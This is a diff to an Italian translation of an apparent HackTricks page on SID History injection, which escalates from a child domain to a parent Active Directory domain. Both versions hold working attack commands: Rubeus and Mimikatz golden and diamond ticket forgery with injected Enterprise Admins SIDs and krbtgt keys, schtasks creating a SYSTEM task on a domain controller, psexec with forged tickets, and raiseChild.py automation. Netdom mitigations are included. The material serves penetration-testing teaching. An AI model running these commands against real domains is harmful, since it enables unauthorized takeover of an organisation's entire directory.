@@ -4,31 +4,31 @@
 
 ## SID History Injection Attack
 
-L'obiettivo del **SID History Injection Attack** è facilitare la **migrazione degli utenti tra domini**, garantendo al contempo l'accesso continuo alle risorse del dominio precedente. Ciò viene ottenuto **incorporando il precedente Security Identifier (SID) dell'utente nella SID History** del nuovo account. In particolare, questo processo può essere manipolato per concedere accessi non autorizzati aggiungendo alla SID History il SID di un gruppo con privilegi elevati (come Enterprise Admins o Domain Admins) del dominio padre. Questo sfruttamento garantisce l'accesso a tutte le risorse del dominio padre.<sup>[[1]](#references)[[2]](#references)</sup>
+L'obiettivo del **SID History Injection Attack** è facilitare la **migrazione degli utenti tra domini**, garantendo al contempo l'accesso continuo alle risorse del dominio precedente. Ciò viene realizzato **incorporando il Security Identifier (SID) precedente dell'utente nella SID History** del nuovo account. In particolare, questo processo può essere manipolato per concedere accessi non autorizzati aggiungendo alla SID History il SID di un gruppo con privilegi elevati (come Enterprise Admins o Domain Admins) del dominio padre. Questo exploit garantisce l'accesso a tutte le risorse del dominio padre.<sup>[[1]](#references)[[2]](#references)</sup>
 
-Esistono due metodi per eseguire questo attacco: attraverso la creazione di un **Golden Ticket** o di un **Diamond Ticket**.
+Esistono due metodi per eseguire questo attacco: tramite la creazione di un **Golden Ticket** o di un **Diamond Ticket**.
 
 Per individuare il SID del gruppo **"Enterprise Admins"**, è innanzitutto necessario trovare il SID del dominio root. Dopo averlo identificato, è possibile costruire il SID del gruppo Enterprise Admins aggiungendo `-519` al SID del dominio root. Ad esempio, se il SID del dominio root è `S-1-5-21-280534878-1496970234-700767426`, il SID risultante per il gruppo "Enterprise Admins" sarà `S-1-5-21-280534878-1496970234-700767426-519`.<sup>[[1]](#references)</sup>
 
-È anche possibile utilizzare i gruppi **Domain Admins**, il cui SID termina con **512**.
+È inoltre possibile utilizzare i gruppi **Domain Admins**, il cui SID termina con **512**.
 
-Un altro modo per trovare il SID di un gruppo dell'altro dominio (ad esempio "Domain Admins") è il seguente:
+Un altro modo per trovare il SID di un gruppo dell'altro dominio (ad esempio "Domain Admins") consiste nell'utilizzare:
 ```bash
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
 ```
 > [!WARNING]
-> Nota che è possibile disabilitare la SID history in una trust relationship, impedendo a questo attacco di funzionare.
+> Nota che è possibile disabilitare la SID history in una relazione di trust, impedendo così il successo di questo attacco.
 
 Secondo la [**documentazione**](https://technet.microsoft.com/library/cc835085.aspx):<sup>[[3]](#references)</sup>
-- **Disabilitare SIDHistory sulle forest trusts** usando lo strumento netdom (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
-- **Applicare SID Filter Quarantining alle external trusts** usando lo strumento netdom (`netdom trust /domain: /quarantine:yes on the domain controller`)
-- **Applicare SID Filtering alle domain trusts all'interno di una singola forest** non è consigliato, poiché si tratta di una configurazione non supportata che può causare breaking changes. Se un domain all'interno di una forest non è affidabile, non dovrebbe essere un membro della forest. In questa situazione è necessario prima separare i domain trusted e untrusted in forest separate, dove è possibile applicare SID Filtering a una trust interforest
+- **Disabilitare SIDHistory sui forest trust** utilizzando lo strumento netdom (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
+- **Applicare SID Filter Quarantining ai trust esterni** utilizzando lo strumento netdom (`netdom trust /domain: /quarantine:yes on the domain controller`)
+- **Applicare SID Filtering ai domain trust all'interno di una singola forest** non è raccomandato, poiché si tratta di una configurazione non supportata e può causare modifiche incompatibili. Se un dominio all'interno di una forest non è affidabile, non dovrebbe essere un membro della forest. In questa situazione è necessario prima separare i domini trusted e untrusted in forest separate, dove è possibile applicare SID Filtering a un trust interforest
 
-Consulta questo post per maggiori informazioni sul bypass di questa misura: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
+Consulta questo post per maggiori informazioni su come bypassare questa protezione: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)<sup>[[4]](#references)</sup>
 
 ### Diamond Ticket (Rubeus + KRBTGT-AES256)
 
-L'ultima volta che ho provato questa tecnica ho dovuto aggiungere l'arg **`/ldap`**.
+L'ultima volta che ho provato, ho dovuto aggiungere l'argomento **`/ldap`**.
 ```bash
 # Use the /sids param
 Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap
@@ -44,7 +44,7 @@ execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domai
 
 # You can use "Administrator" as username or any other string
 ```
-### Golden Ticket (Mimikatz) con KRBTGT-AES256
+### Golden Ticket (Mimikatz) with KRBTGT-AES256
 ```bash
 mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"
 
@@ -80,7 +80,7 @@ diamond-ticket.md
 .\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
 ls \\mcorp-dc.moneycorp.local\c$
 ```
-Esegui l'escalation a DA del dominio root o a Enterprise admin usando l'hash KRBTGT del dominio compromesso:
+Eseguire l'escalation a DA del dominio root o a Enterprise admin usando l'hash KRBTGT del dominio compromesso:
 ```bash
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
 
@@ -92,7 +92,7 @@ schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTE
 
 schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
 ```
-Con i permessi acquisiti durante l'attacco puoi eseguire, ad esempio, un attacco DCSync nel nuovo dominio:
+Con i permessi ottenuti dall'attacco puoi eseguire, ad esempio, un attacco DCSync nel nuovo dominio:
 
 
 {{#ref}}
@@ -121,28 +121,29 @@ export KRB5CCNAME=hacker.ccache
 # psexec in domain controller of root
 psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
 ```
-#### Automatico usando [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
+#### Automatic using [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
 
-Questo è uno script di Impacket che **automatizza l'escalation dal child domain al parent domain**. Lo script richiede:
+Questo è uno script di Impacket che **automatizza l'escalation dal dominio figlio a quello padre**. Lo script richiede:
 
-- Domain controller di destinazione
-- Credenziali di un utente amministratore nel child domain
+- Domain controller target
+- Credenziali per un utente admin nel dominio figlio
 
 Il flusso è:
 
-- Ottiene il SID del gruppo Enterprise Admins del parent domain
-- Recupera l'hash dell'account KRBTGT nel child domain
+- Ottiene il SID del gruppo Enterprise Admins del dominio padre
+- Recupera l'hash dell'account KRBTGT nel dominio figlio
 - Crea un Golden Ticket
-- Effettua il login nel parent domain
-- Recupera le credenziali dell'account Administrator nel parent domain
-- Se viene specificato lo switch `target-exec`, esegue l'autenticazione al Domain Controller del parent domain tramite Psexec.
+- Effettua il login nel dominio padre
+- Recupera le credenziali dell'account Administrator nel dominio padre
+- Se viene specificato lo switch `target-exec`, esegue l'autenticazione al Domain Controller del dominio padre tramite Psexec.
 ```bash
 raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
 ```
 ## Riferimenti
 
-- [1] [Sneaky Active Directory Persistence #14: SID History - adsecurity.org](https://adsecurity.org/?p=1772)
-- [2] [Cos'è un Security Identifier (SID)? - SentinelOne](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
-- [3] [Considerazioni sulla sicurezza per le relazioni di Trust - Microsoft TechNet](https://technet.microsoft.com/library/cc835085.aspx)
+- [1] [Persistenza furtiva in Active Directory #14: SID History - adsecurity.org](https://adsecurity.org/?p=1772)
+- [2] [Che cos'è il Security Identifier (SID)? - SentinelOne](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
+- [3] [Considerazioni sulla sicurezza per le relazioni di trust - Microsoft TechNet](https://technet.microsoft.com/library/cc835085.aspx)
+- [4] [itm8.com - SID Filter come limite di sicurezza tra domini, parte 4](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
 
 {{#include ../../banners/hacktricks-training.md}}
